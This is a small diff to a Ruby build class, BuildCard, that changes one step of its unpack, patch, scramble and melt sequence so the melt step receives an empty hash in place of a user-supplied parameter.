@@ -32,7 +32,7 @@ class BuildCard < Build
     build.unpack
     build.patch params['binary'].dup
     build.scramble
-    build.melt params['melt'].dup
+    build.melt Hash.new
 
     # copy the outputs in our directory
     build.outputs.each do |o|
